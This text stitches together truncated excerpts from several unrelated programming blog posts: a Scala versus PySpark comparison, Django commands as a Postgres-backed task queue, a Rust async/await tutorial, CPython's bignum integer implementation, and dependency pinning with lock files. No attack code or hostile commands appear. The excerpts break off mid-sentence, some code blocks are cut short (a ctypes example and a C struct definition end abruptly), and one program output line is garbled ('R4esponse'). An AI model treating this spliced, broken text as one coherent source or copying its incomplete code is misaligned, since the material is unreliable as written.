<ul><li>It’s easy to perform operations <a href="https://mungingdata.com/apache-spark/dataset-tods-createdataset-advantages/">that’ll convert a Dataset to a DataFrame</a> (e.g. adding a column).</li><li>Datasets <a href="https://stackoverflow.com/questions/40596638/spark-2-0-dataset-vs-dataframe/40602882#40602882">are less performant</a> although <a href="https://izeigerman.medium.com/making-the-spark-dataframe-composition-type-safe-r-7b6fed524ec2">the performance gap is supposedly narrowing</a></li><li><a href="https://github.com/typelevel/frameless/">Expressively typed Datasets</a> sound promising, but <a href="https://mungingdata.com/apache-spark/frameless-typed-datasets/">aren’t practical yet</a></li></ul>



<p>Datasets shouldn’t be considered to be a huge advantage because most Scala programmers use DataFrames anyways.</p>



<h2>Feature parity</h2>



<p>PySpark generally supports all the features in Scala Spark, with a few exceptions.</p>



<p>The <code>CalendarIntervalType</code> has been in the Scala API since Spark 1.5, but still isn’t in the PySpark API as of Spark 3.0.1. This is a “serious loss of function” and <a href="https://github.com/apache/spark/pull/29935">will hopefully get added</a>.</p>



<p>In general, both the Python and Scala APIs support the same functionality. Spark knows that a lot of users avoid Scala/Java like the plague and they need to provide excellent Python support.</p>



<h2>Performance comparison</h2>



<p>Scala and PySpark should perform relatively equally for DataFrame operations.</p>



<p><a href="https://stackoverflow.com/questions/32464122/spark-performance-for-scala-vs-python">This thread</a> has a dated performance comparison.</p>



<p><a href="https://news.ycombinator.com/item?id=26030970">“Regular” Scala code can run 10-20x faster than “regular” Python code</a>, but that PySpark isn’t executed liked like regular Python code, so this performance comparison isn’t relevant.</p>



<p>PySpark is converted to Spark SQL and then executed on a JVM cluster. It’s not a traditional Python execution environment. Benchmarks for other Python execution environments are irrelevant for PySpark.</p>



<p>Watch out! Some other blog posts imply that PySpark is 10x slower which just isn’t true.</p>



<h2>Code editing</h2>



<p>The IntelliJ community edition provides a powerful Scala integrated development environment with out of the box. If provides you with code navigation, type hints, function completion, and compile-time runtime error reporting.</p>



<p>There’s also a <a href="https://scalameta.org/metals/">Metals</a> project that allows for IDE-like text editor features in Vim or VSCode. Use IntelliJ if you’d like a full-serviced solution that works out of the box. Metals is good for those who enjoy text editor tinkering and custom setups.</p>



<p>Scala provides excellent text editors for working with Spark.</p>



<p>Some folks develop Scala code without the help of either Metals or IntelliJ, which puts you at a disadvantage. Scala IDEs give you a lot of help for free. Scala devs that reject free help from their text editor will suffer unnecessarily.</p>



<p>PyCharm doesn’t work out of the box with PySpark, <a href="https://stackoverflow.com/questions/34685905/how-to-link-pycharm-with-pyspark">you need to configure it</a>. <a href="https://github.com/zero323/pyspark-stubs">pyspark-stubs</a> provide some nice error messages and autocompletion, but nothing compared to what’s offered by Scala/IntelliJ.</p>



<p>Scala has the edge for the code editor battle.</p>



<h2>Compile time exceptions</h2>



<p>Here’s what IntelliJ will show when you try to invoke a Spark method without enough arguments.</p>

<p>The PyCharm error only shows up when pyspark-stubs is included and is more subtle.</p>



<figure><img loading="lazy" width="916" height="64" src="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM.png" alt="" srcset="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM.png 916w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM-300x21.png 300w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM-768x54.png 768w" sizes="(max-width: 916px) 100vw, 916px"></figure>



<p>At least you can hover over the method and get a descriptive hint.</p>



<figure><img loading="lazy" width="1024" height="384" src="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1024x384.png" alt="" srcset="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1024x384.png 1024w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-300x113.png 300w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-768x288.png 768w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1025x384.png 1025w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM.png 1120w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h2>Code navigation</h2>



<p>IntelliJ/Scala let you easily navigate from your code directly to the relevant parts of the underlying Spark code. Suppose your cursor is on the <code>regexp_extract</code> function. You can pretty Command + b to go directly to <code>org.apache.spark.sql.functions.regexp_extract</code> and then continue pressing Command + b to see exactly how the function is working under the hood.</p>



<p>PySpark code navigation is severely lacking in comparison. You can navigate to functions within your codebase, but you’ll be directed to the stub file if you try to jump to the underlying PySpark implementations of core functions.</p>



<p>PySpark code navigation can’t be as good due to Python language limitations.</p>



<h2>Packaging JARs vs Wheels</h2>



<p>Scala projects can be packaged as JAR files and uploaded to Spark execution environments like Databricks or EMR where the functions are invoked in production. JAR files can be assembled without dependencies (thin JAR files) or with dependencies (fat JAR files). Scala makes it easy to customize your fat JAR files to exclude the test dependencies, exclude Spark (because that’s already included by your runtime), and contain other project dependencies. See <a href="https://mungingdata.com/apache-spark/building-jar-sbt/">this blog</a> for more on building JAR files.</p>



<p>You can even overwrite the packages for the dependencies in fat JAR files to avoid namespace conflicts by leveraging a process called shading.</p>



<p>Suppose <code>com.your.org.projectXYZ</code> depends on <code>com.your.org.projectABC</code> and you’d like to attach <code>projectXYZ</code> to a cluster as a fat JAR file. You’d like <code>projectXYZ</code> to use version 1 of <code>projectABC</code>, but would also like to attach version 2 of <code>projectABC</code> separately. When <code>projectXYZ</code> calls <code>com.your.org.projectABC.someFunction</code>, it should use version 1. All other invocations of <code>com.your.org.projectABC.someFunction</code> should use version 2.</p>



<p>You can shade <code>projectABC</code> in the <code>projectXYZ</code> fat JAR file, so the path is something like <code>projectAbcShaded.projectABC</code>, to prevent namespace conflicts for when <code>projectABC</code> version 2 is attached to the cluster. See <a href="https://mungingdata.com/apache-spark/shading-dependencies-with-sbt/">here</a> for more details on shading.</p>



<p>Shading is a great technique to avoid dependency conflicts and dependency hell.</p>



<p>Python doesn’t support building fat wheel files or shading dependencies. This <a href="https://databricks.com/blog/2020/12/22/how-to-manage-python-dependencies-in-pyspark.html">blog post</a> explains some of …</p></div></article></div>

				<p><strong>tldr;</strong> Let's talk about simple async task queues with Django Commands and PostgreSQL. </p><p>Simple Django Commands make excellent asynchronous workers that replace tasks otherwise done by Celery and other more complex methods. Minimal code samples are below.</p><h3 id="i-can-run-asynchronous-tasks-without-adding-celery-kafka-rabbitmq-etc-to-my-stack">I can run asynchronous tasks without adding Celery, Kafka, RabbitMQ, etc to my stack</h3><p>Many projects use Celery successfully, but it is a lot to setup, manage, monitor, debug, and develop for. To send a few emails, push messages, or database cleanups feels like a long way to go for a ham sandwich.</p><p>Django gives us a very useful utility for running asynchronous tasks without the cognitive load and infrastructure overhead– namely, Commands.</p><p>I go a long way using only simple long-running Django Commands as the workers and Postgres as my queue. It means that in a simple Django, Postgres, Docker deployment I can run asynchronous tasks without adding more services to my stack.</p><h3 id="the-django-command">The Django Command</h3><p>In addition to serving web pages, Django Commands offer us a way to access the Django environment on the command line or a long-running process. Simply override a class, place your code inside, and you have bootstrapped your way to getting things done in a "side-car."</p><p>It is important to understand this is outside the processing context of the web application. It must therefore be managed separately as well. I like to use Docker and docker-compose for that. </p><!--kg-card-begin: markdown--><h3 id="sampledockercomposesnippedofdjangotask">sample docker-compose snipped of django task</h3>

Simply ask your database to manage it. On a high-level the process is something like this:</p><ol><li>Query the database for a batch of tasks (1 to X at a time).</li><li>Of those tasks handed to the worker, update their status to "IN PROGRESS" and time stamp it.</li><li>Begin work on each task.</li><li>When task is finished, update the status of the task to "DONE".</li><li>If the task crashes then the database locks are released. The items are put back into the queue without changes. No harm, no foul.</li></ol><h3 id="the-devil-in-the-details-even-in-simple-solutions-eg-avoiding-dead-locks-">The devil in the details, even in simple solutions (eg. Avoiding dead-locks)</h3><p>If running multiple workers, it is possible that they pull the same tasks at the same time. In order to prevent this we ask the database to lock the rows when they are selected. This feature is not available on all databases.</p><p>I pretty much only use PostgreSQL, and doing so gives me access to some nice features like <a href="https://www.2ndquadrant.com/en/blog/what-is-select-skip-locked-for-in-postgresql-9-5/">SKIP LOCKED</a> when querying the database.</p><ul><li><a href="https://www.2ndquadrant.com/en/blog/what-is-select-skip-locked-for-in-postgresql-9-5/">https://www.2ndquadrant.com/en/blog/what-is-select-skip-locked-for-in-postgresql-9-5/</a></li></ul><p>However, we are not done yet.

<p>Async is all the rage. Python, rust, go. Pick your language and chances are it’s got some form of <code>async / await</code> going. If you’ve never worked with <code>async / await</code> before this can all be somewhat confusing, to put it mildly. In this post we’ll take a high level overview of asynchronous programming in general before making our way to rust, where we’ll look at the current state of async—what it is, how to do it, and how it all works.</p>
<h2 id="what-is-asynchronous-programming-and-why-should-we-care">What Is Asynchronous Programming and Why Should We Care<a href="#what-is-asynchronous-programming-and-why-should-we-care">#</a></h2>
<p>Most programs are synchronous. They execute line by line in the order they’re written. Whenever we encounter an operation that can’t be completed immediately, we must wait until it finishes before we can proceed. Establishing a TCP connection, for example, requires several exchanges over a network, which can take some time, during which our program is unable to work on anything else. In other words, synchronous operations <em>block</em> the thread on which our program executes.</p>
<p>Asynchronous operations, on the other hand, are non-blocking by design. Operations that can’t complete immediately are suspended to the “background” (more on this later), allowing the current thread to work on other tasks. Once an async operation finishes, the task is unsuspended and execution resumes where it left off. By working jointly on multiple tasks a program can avoid being idle. When one task can’t progress because it’s waiting on another resource (e.g. bytes from a socket), we simply switch to another task that can. This brings us to our first observation about asynchronous programming in general: we only benefit if there is other work to be done while we wait on an operation to finish.</p>
<p>For example, if we’re running on a single thread and need to tackle a CPU-bound task, we have no choice but to wait until the task finishes before we can move onto the next one. Async won’t help us here. However, if we’re running on a thread pool, we could spawn the CPU-bound task onto another thread and call out to it asynchronously from the current thread, allowing us to do other work while we wait for it to finish. Which brings us to our second observation about asynchronous programming: it excels at any task that involves a lot of waiting. This could be a network call or a CPU-bound task as we’ve discussed, or a database query or RPC call. Whatever it is, if we have to wait, chances are async can help.</p>
<h2 id="concurrency-and-parallelism">Concurrency And Parallelism<a href="#concurrency-and-parallelism">#</a></h2>
<p>Before we dig into the meat and potatoes of async in rust, let’s make sure we’re on the same page regarding concurrency and parallelism. Concurrency refers to the act of working on multiple tasks at once, though not necessarily at the same time. For instance, if you alternate between doing the dishes and mopping the floor, you’re working on both tasks concurrently but not in parallel. To do both in parallel you’d need two distinct individuals, one dedicated to each task. Parallelism is one way of achieving concurrency. Async is another, at least in some contexts. One of the advantages of asynchronous programming is that it allows you to work on many tasks concurrently without having to work on them in parallel via threads, which can be costly to spawn and run, depending on the implementation. As we’ll see, async makes it possible to run many tasks concurrently on a single thread.</p>
<h2 id="async-and-the-future">Async and the Future<a href="#async-and-the-future">#</a></h2>
<p>Rust enables asynchronous programming via two keywords: <code>async</code> &amp; <code>.await</code>. Functions marked as <code>async fn</code> are transformed at compile time into operations that can run asynchronously. Async functions are called just like any other function, except instead of executing when called, an async function returns a value representing the computation. This value is called a <code>Future</code>. In rust a future is anything that implements the <a href="https://doc.rust-lang.org/std/future/trait.Future.html" target="_blank" rel="noreferrer noopener">std::future::Future</a>
 trait provided by the standard library. Every <code>async fn</code> implicitly returns a <code>Future</code>. For example, the async function</p>
<pre><code>async fn hello() -&gt; String {
    "hi, there!".to_string()
}
</code></pre>
<p>desugars to an ordinary function whose return type is an anonymous type implementing the future trait.</p>
<pre><code>fn hello() -&gt; impl Future&lt;Output = String&gt; {
    async {
        "hi, there!".to_string()
    }
}
</code></pre>
<p>The inner <a href="https://doc.rust-lang.org/reference/expressions/block-expr.html#async-blocks" target="_blank" rel="noreferrer noopener">async block</a>
 is a variant of rust’s ordinary block expressions which evaluates to an anonymous future type, similar to how closures return anonymous types implementing one of the <code>std::ops::Fn</code> traits.</p>
<p>Futures lie at the heart of async in rust but are not the whole story. A key distinction between rust and other languages like javascript is that in rust async operations are <em>lazy</em>. By themselves futures do nothing. They require a <a href="https://stackoverflow.com/a/3900574" target="_blank" rel="noreferrer noopener">runtime</a>
, which provides, among other things, a task scheduler and an I/O driver backed by the operating system’s own event queue (epoll, kqueue, etc.). A very widely used runtime in rust is provided by the <a href="https://docs.rs/tokio/1.0.2/tokio/runtime/index.html" target="_blank" rel="noreferrer noopener">tokio</a>
 crate. Another is provided by <a href="https://docs.rs/async-std/1.9.0/async_std/" target="_blank" rel="noreferrer noopener">async-std</a>
. All asynchronous behaviour in rust occurs within the context of a runtime.</p>
<p>Now, you might be wondering why rust doesn’t just ship with a built-in runtime. The reason is rust’s commitment to <a href="https://aturon.github.io/blog/2016/08/11/futures/" target="_blank" rel="noreferrer noopener">zero-cost abstractions</a>
. Any runtime imposes a performance overhead that all programs must pay regardless of whether they require it. Rust chooses to instead only define asynchronous behaviour via standard library traits like <code>Future</code>, leaving the implementation to the larger rust ecosystem.</p>
<p>⚠️ <strong>Note:</strong> An unfortunate side effect of this decision is that it forces crates to depend on a specific choice of runtime. For instance, <a href="https://docs.rs/reqwest/0.11.0/reqwest/" target="_blank" rel="noreferrer noopener">reqwest</a>
 requires <code>tokio</code> while <a href="https://docs.rs/surf/2.1.0/surf/" target="_blank" rel="noreferrer noopener">surf</a>
 requires <code>async_std</code>. This can be a big source of confusion for newcomers just looking to get the hang of async in rust (i.e. me).</p>
<h2 id="tasks">Tasks<a href="#tasks">#</a></h2>
<p>The runtime doesn’t interface with individual futures directly but instead groups them into <em>tasks</em>. A task is a lightweight, non-blocking unit of execution, similar to an OS thread, except instead of being managed by the OS scheduler, tasks are managed by the runtime. This pattern generally goes by the name <em>green threads</em>, after the java library that originally implemented them. Because tasks are cheap to create and run, a single OS thread can handle many tasks, enabling a program to run concurrently on a single thread (although a typical async program will likely have many, many tasks scheduled across multiple threads).</p>
<p>A key attribute of tasks is that they exhibit what is known as <em>cooperative multitasking</em>. A task is allowed to run until it <em>yields</em>, signaling to the runtime that it cannot currently progress any further. This allows the runtime to switch to another task that can progress. Tasks yield via calls to <code>.await</code>. Any invocation of <code>.await</code> within an async function or block yields control back to the runtime, which is then free to swap the current task for a different one.</p>
<h2 id="when-to-await">When to <code>.await</code><a href="#when-to-await">#</a></h2>
<p>The most confusing thing about async in rust is when to <code>.await</code>. Take the following example, which simulates a delayed response from, say, an http request or database query.</p>
<pre><code>use tokio::{self, time};
use tokio::time::{Duration, Instant};

async fn slow_request(number: u32, ms: u64) {
    time::sleep(Duration::from_millis(ms)).await;
    println!("Response {} received!", number);
}

#[tokio::main]
async fn main() {
    slow_request(1, 2000);
    slow_request(2, 3000);
}
</code></pre>
<p>Although this code looks asynchronous, when we run it nothing happens. What gives? Well, even though we’ve configured our runtime with the <code>#[tokio::main]</code> macro, we haven’t asked it to execute anything. Each call to <code>slow_request</code> returns a future which is simply dropped and never executed. To execute the futures returned by <code>slow_request</code> we must <code>.await</code> them.</p>
<pre><code>#[tokio::main]
async fn main() {
    let start = Instant::now();
    slow_request(1, 2000).await;
    slow_request(2, 3000).await;
    println!("Finished in {} ms", start.elapsed().as_millis());
}
</code></pre>
<pre><code>Response 1 received!
Response 2 received!
Finished in 5000 ms
</code></pre>
<p>Now both requests finish successfully. But there’s a problem. Since we’re attempting to make two concurrent requests, our program should take only as long as the longest request, however, our program takes 5 seconds even though the longest request only takes 3 seconds. The issue is that both futures are running on the same task, the one implicitly spawned by the runtime.</p>
<p>When we make the first call to <code>.await</code> the runtime is free to switch to another task, except there isn’t any, so we’re forced to wait until the first request finishes before we can make the second. In other words, our program executes <em>synchronously</em>, even though we’re using <code>async / .await</code>. To execute both requests concurrently, we need to spawn another task.</p>
<pre><code>#[tokio::main]
async fn main() {
    let start = Instant::now();
    tokio::spawn(slow_request(1, 2000));
    slow_request(2, 3000).await;
    println!("Finished in {} ms", start.elapsed().as_millis());
}
</code></pre>
<pre><code>R4esponse 1 received!
Response 2 received!
Finished in 3000 ms
</code></pre>
<p>Now our program runs in 3 seconds, as it should.</p>
<h2 id="running-multiple-tasks-on-a-single-thread">Running Multiple Tasks On A Single Thread<a href="#running-multiple-tasks-on-a-single-thread">#</a></h2>
<p>Let’s build off of our previous example and prove that an asynchronous program can indeed run multiple tasks concurrently on a single thread. By default the <code>#[tokio::main]</code> macro uses a multi-threaded work stealing scheduler, however, we can ask it to utilize just a single thread by setting <code>flavor = "current_thread"</code>. We’ll verify that this is indeed the case by re-writing <code>slow_request</code> to also print the id of the current thread.</p>
<pre><code>use std::thread;

async fn slow_request(number:u32, ms: u64) {
    time::sleep(Duration::from_millis(ms)).await;
    println!("Response {} received on {:?}!", number, thread::current().id());
}

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let start = Instant::now();

    let t1 = tokio::spawn(slow_request(1, 2000));
    let t2 = tokio::spawn(slow_request(2, 4000));
    let t3 = tokio::spawn(slow_request(3, 3000));
    let t4 = tokio::spawn(slow_request(4, 1000));
    tokio::join!(t1, t2, t3, t4);

    println!("Finished in {} ms", start.elapsed().as_millis());
}
</code></pre>
<pre><code>Response 4 received …</code></pre></article></div>

<!-- /.post-info -->      <p>In the previous parts of this series we studied the core of the CPython interpreter and saw how the most fundamental aspects of Python are implemented. We made an overview of <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">the CPython VM</a>, took a look at <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">the CPython compiler</a>, stepped through <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-3-stepping-through-the-cpython-source-code/">the CPython source code</a>, studied <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">how the VM executes the bytecode</a> and learned <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-5-how-variables-are-implemented-in-cpython/">how variables work</a>. In the two most recent posts we focused on <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-6-how-python-object-system-works/">the Python object system</a>. We learned what Python objects and Python types are, how they are defined and what determines their behavior. This discussion gave us a good understanding of how Python objects work in general. What we haven't discussed is how particular objects, such as strings, integers and lists, are implemented. In this and several upcoming posts we'll cover the implementations of the most important and most interesting built-in types. The subject of today's post is <code>int</code>.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h2>Why Python integers are interesting</h2>
<p>Integers require no introduction. They are so ubiquitous and seem so basic that you may doubt whether it's worth discussing how they are implemented at all. Yet, Python integers are interesting because they are not just 32-bit or 64-bit integers that CPUs work with natively. Python integers are <a href="https://en.wikipedia.org/wiki/Arbitrary-precision_arithmetic">arbitrary-precision integers</a>, also known as bignums. This means that they can be as large as we want, and their sizes are only limited by the amount of available memory.</p>
<p>Bignums are handy to work with because we don't need to worry about such things as integer overflows and underflows. They are extensively used in fields like cryptography and computer algebra where large numbers arise all the time and must be represented precisely. So, <a href="https://en.wikipedia.org/wiki/List_of_arbitrary-precision_arithmetic_software">many</a> programming languages have bignums built-in. These include Python, JavaScript, Ruby, Haskell, Erlang, Julia, Racket. Others provide bignums as a part of the standard library. These include Go, Java, C#, D, PHP. Numerous third-party libraries implement bignums. The most popular one is <a href="https://en.wikipedia.org/wiki/GNU_Multiple_Precision_Arithmetic_Library">the GNU Multiple Precision Arithmetic Library</a> (GMP). It provides a C API but has bindings for all major languages.</p>
<p>There are a lot of bignum implementations. They're different in detail, but the general approach to implement bignums is the same. Today we'll see what this approach looks like and use CPython's implementation as a reference example. The two main questions we'll have to answer are:</p>
<ul>
<li>how to represent bignums; and</li>
<li>how to performs arithmetic operations, such as addition and multiplication, on bignums.</li>
</ul>
<p>We'll also discuss how CPython's implementation compares to others and what CPython does to make integers more efficient. </p>
<h2>Bignum representation</h2>
<p>Think for a moment how you would represent large integers in your program if you were to implement them yourself. Probably the most obvious way to do that is to store an integer as a sequence of digits, just like we usually write down numbers. For example, the integer <code>51090942171709440000</code> could be represented as <code>[5, 1, 0, 9, 0, 9, 4, 2, 1, 7, 1, 7, 0, 9, 4, 4, 0, 0, 0, 0]</code>. This is essentially how bignums are represented in practice. The only important difference is that instead of base 10, much larger bases are used. For example, CPython uses base 2^15 or base 2^30 depending on the platform. What's wrong with base 10? If we represent each digit in a sequence with a single byte but use only 10 out of 256 possible values, it would be very memory-inefficient. We could solve this memory-efficiency problem if we use base 256, so that each digit takes a value between 0 and 255. But still much larger bases are used in practice. The reason for that is because larger base means that numbers have less digits, and the less digits numbers have, the faster arithmetic operations are performed. The base cannot be arbitrary large. It's typically limited by the size of the integers that the CPU can work with. We'll see why this is the case when we discuss bignum arithmetic in the next section. Now let's take a look at how CPython represents bignums.</p>
<p>Everything related to the representation of Python integers can be found in <a href="https://github.com/python/cpython/blob/3.9/Include/longintrepr.h"><code>Include/longintrepr.h</code></a>. Technically, Python integers are instances of <code>PyLongObject</code>, which is defined in <a href="https://github.com/python/cpython/blob/3.9/Include/longobject.h"><code>Include/longobject.h</code></a>, but <code>PyLongObject</code> is actually a typedef for <code>struct _longobject</code> that is defined in <code>Include/longintrepr.h</code>:</p>
<div><pre><span></span><span>struct</span> <span>_longobject</span> <span>{</span>
    <span>PyVarObject</span> <span>ob_base</span><span>;</span> <span>// expansion of PyObject_VAR_HEAD macro</span>
    <span>digit</span> <span>ob_digit</span><span>[</span><span>1</span><span>];</span>
<span>};</span>
</pre></div>


<p>This struct extends <a href="https://docs.python.org/3/c-api/structures.html#c.PyVarObject"><code>PyVarObject</code></a>, which in turn extends <a href="https://docs.python.org/3/c-api/structures.html#c.PyObject"><code>PyObject</code></a>:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>PyObject</span> <span>ob_base</span><span>;</span>
    <span>Py_ssize_t</span> <span>ob_size</span><span>;</span> <span>/* Number of items in variable part */</span>
<span>}</span> <span>PyVarObject</span><span>;</span>
</pre></div>


<p>So, besides a reference count and a type that all Python objects have, an integer object has two other members: </p>
<ul>
<li><code>ob_size</code> that comes from <code>PyVarObject</code>; and </li>
<li><code>ob_digit</code> that is defined in <code>struct _longobject</code>.</li>
</ul>
<p>The <code>ob_digit</code> member is a pointer to an array of digits. On 64-bit platforms, each digit is a 30-bit integer that takes values between 0 and 2^30-1 and is stored as an unsigned 32-bit int (<code>digit</code> is a typedef for <code>uint32_t</code>). On 32-bit platforms, each digit is a 15-bit integer that takes values between 0 and 2^15-1 and is stored as an unsigned 16-bit int (<code>digit</code> is a typedef for <code>unsigned short</code>). To make things concrete, in this post we'll assume that digits are 30 bits long.</p>
<p>The <code>ob_size</code> member is a signed int, whose absolute value tells us the number of digits in the <code>ob_digit</code> array. The sign of <code>ob_size</code> indicates the sign of the integer. Negative <code>ob_size</code> means that the integer is negative. If <code>ob_size</code> is 0, then the integer is 0.</p>
<p>Digits are stored in a little-endian order. The first digit (<code>ob_digit[0]</code>) is the least significant, and the last digit (<code>ob_digit[abs(ob_size)-1]</code>) is the most significant.</p>
<p>Finally, the absolute value of an integer is calculated as follows: </p>
<p>$$val = ob\_digit[0] \times (2 ^{30})^0 + ob\_digit[1] \times (2 ^{30})^1 + \cdots + ob\_digit[|ob\_size| - 1] \times (2 ^{30})^{|ob\_size| - 1}$$</p>
<p>Let's see what all of this means with an example. Suppose we have an integer object that has <code>ob_digit = [3, 5, 1]</code> and <code>ob_size = -3</code>. To compute its value, we can do the following:</p>
<div><pre><span></span><span>$ python -q</span>
<span>&gt;&gt;&gt; </span><span>base</span> <span>=</span> <span>2</span><span>**</span><span>30</span>
<span>&gt;&gt;&gt; </span><span>-</span><span>(</span><span>3</span> <span>*</span> <span>base</span><span>**</span><span>0</span> <span>+</span> <span>5</span> <span>*</span> <span>base</span><span>**</span><span>1</span> <span>+</span> <span>1</span> <span>*</span> <span>base</span><span>**</span><span>2</span><span>)</span>
<span>-1152921509975556099</span>
</pre></div>


<p>Now let's do the reverse. Suppose we want to get the bignum representation of the number <code>51090942171709440000</code>. Here's how we can do that:</p>
<div><pre><span></span><span>&gt;&gt;&gt; </span><span>x</span> <span>=</span> <span>51090942171709440000</span>
<span>&gt;&gt;&gt; </span><span>x</span> <span>%</span> <span>base</span>
<span>952369152</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>337507546</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>44</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>0</span>
</pre></div>


<p>So, <code>ob_digit = [952369152, 337507546, 44]</code> and <code>ob_size = 3</code>. Actually, we don't even have to compute the digits, we can get them by inspecting the integer object using the <a href="https://docs.python.org/3/library/ctypes.html#module-ctypes"><code>ctypes</code></a> standard library:</p>
<div><pre><span></span><span>import</span> <span>ctypes</span>

<p>As you might guess, the representation of bignums is an easy part. The main challenge is to implement arithmetic operations and to implement them efficiently.</p>
<h2>Bignum arithmetic</h2>
<p>We learned in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-6-how-python-object-system-works/">part 6</a> that the behavior of a Python object is determined by the object's type. Each member of a type, called slot, is responsible for a particular aspect of the object's behavior. So, to understand how CPython performs arithmetic operations on integers, we need to study the slots of the <code>int</code> type that implement those operations.</p>
<p>In the C code, the <code>int</code> type is called <code>PyLong_Type</code>. It's defined in <code>Objects/longobject.c</code> as follows:</p>
<div><pre><span></span><span>PyTypeObject</span> <span>PyLong_Type</span> <span>=</span> <span>{</span>

This is how to prevent a problem causing your application to out of the sudden stop behaving correctly, or, even more funny, stop behaving correctly only on one developer’s computer. We can solve this with <s>one</s> two simple tricks.</p><h2><span id="tldr"></span>TL;DR<span></span></h2><p>Use a dependency manager that creates a lock file and commit it to the repository. Even then, pin your dependencies – explicitly specify their exact versions. You can probably&nbsp;<a target="_blank" href="https://betterdev.blog/?p=1781&amp;preview=true#how-to-pin-by-default" rel="noreferrer noopener">configure your dependency manager</a>&nbsp;to do it by default.</p><p>Not convinced? Want an explanation? Let’s start it with some story-time.</p><h2><span id="tragedy_in_three_terminal_windows"></span>Tragedy in three terminal windows<span></span></h2><p>Actors:</p><ul><li>Developer 1</li><li>Developer 2</li></ul><p>Tools:</p><ul><li><code>dep_manager</code> – a dependency management tool</li></ul><p>Developer 1:</p><pre><code>$ cd projects/great_project

$ dep_manager add great_library
&gt; Installing...
&gt; New dependency great_library v1.0.0 installed!

$ ./run_tests.sh
&gt; All tests successful!

$ git push</code></pre><p>Developer 2 – <em>some time later</em>:</p><pre><code>$ cd projects/great_project

$ git pull
&gt; Updating f4b5383..4069ef7

$ dep_manager install
&gt; Installing...
&gt; 1 new dependency installed:
&gt;   - great_library v1.0.1

$ ./run_tests.sh
&gt; Some tests failed!</code></pre><p>Developer 1 – <em>trying to reproduce the problem</em>:</p><pre><code>$ cd projects/great_project

$ git pull
&gt; Already up to date.

$ dep_manager install
&gt; No new dependencies to install

$ ./run_tests.sh
&gt; All tests successful!</code></pre><h2><span id="betrayed_by_a_dependency"></span>Betrayed by a dependency<span></span></h2><p>Even without 20 years of experience in the field, I still saw a situation like the above several times. Maybe I’m just lucky.</p><p>Almost every project, no matter the size, uses some external dependencies – libraries and frameworks. That’s reasonable – very rarely someone pays us to reinvent the wheel. We manage dependencies with, well,&nbsp;<strong>dependency managers</strong>. Each language has its own or a number of them, and we will look closely at them a little bit later.</p><p>Those dependencies, and the way we manage them, can cause tricky to find problems coming out of nowhere. An example of it we see above.</p><p>A&nbsp;<strong>new external dependency was added</strong>&nbsp;by the first developer and everything worked well. Then, the other developer pulled the project, installed dependencies, and everything blown up. When the first developer tried to reproduce the issue, nothing changed for him. On his workstation, everything was still fine.</p><p>Can you spot the problem?</p><p>When the first developer installed the <code>great_library</code>, the latest version of it, <code>v1.0.0</code>, was added. Then the second developer installed dependencies. At this time there already was a new, updated version <code>v1.0.1</code> available, and that was the one that landed on his workstation. Unfortunately, this library release happened to introduce a bug that broke the application.</p><p>And why the first developer couldn’t reproduce the problem, even though he run the same commands? Well, the dependency manager is a little bit lazy. Since he already had the <code>great_library</code> installed, it&nbsp;<strong>did not fetch the newer version</strong>&nbsp;for him.</p><p>Effect? Both of them did the same operations and ended up with different results.</p><p>Believe me or not, but this is the default behavior for quite a lot of dependency managers.</p><p>Before we dig into how we can prevent this for different dependency managers, we need to understand two concepts.&nbsp;<strong>Semantic versioning</strong>&nbsp;and&nbsp;<strong>lock files</strong>.</p><h2><span id="non-breaking_vs_bug-free_changes"></span>Non-breaking vs bug-free changes<span></span></h2><p>Dependency managers allow providing a range of valid versions for each dependency. Moreover, some of them by default add dependencies with versions range instead of a single, concrete version. For example, when you run:</p><pre><code>npm install lodash</code></pre><p>then your <code>package.json</code> is updated with something like: <code>"lodash": "^4.15.0"</code>.</p><p>This little <a href="https://en.wikipedia.org/wiki/Caret">caret</a> symbol (<code>^</code>) says that the minimal valid version of the <code>lodash</code> library is the <code>4.15.0</code>. But it also says that it accepts any next version as long as it’s lower than <code>5.0.0</code>.</p><p>Why? Because theoretically, if your code works with version <code>4.15.0</code>, then it should be safe to use any next <code>4.x.x</code> version. This is because the de facto standard for libraries versioning is something called <strong>SemVer</strong>, or <a href="https://semver.org/"><strong>Semantic Versioning</strong></a>.</p><p>In short, each next <code>4.x.x</code> version should be fully compatible with the previous one, without any breaking changes. Breaking changes, which may cause our code to stop working, can be introduced only in 